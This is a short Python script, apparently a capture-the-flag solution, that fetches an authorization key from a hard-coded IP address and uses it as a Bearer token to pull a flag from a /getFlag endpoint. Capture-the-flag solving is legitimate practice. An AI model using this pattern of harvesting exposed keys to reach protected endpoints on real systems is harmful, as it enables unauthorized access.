from requests import get

key = get("http://62.84.118.87:3000").json()["key"]
print(get("http://62.84.118.87:3000/getFlag", headers={"Authorization": f"Bearer {key}"}).json()["flag"])
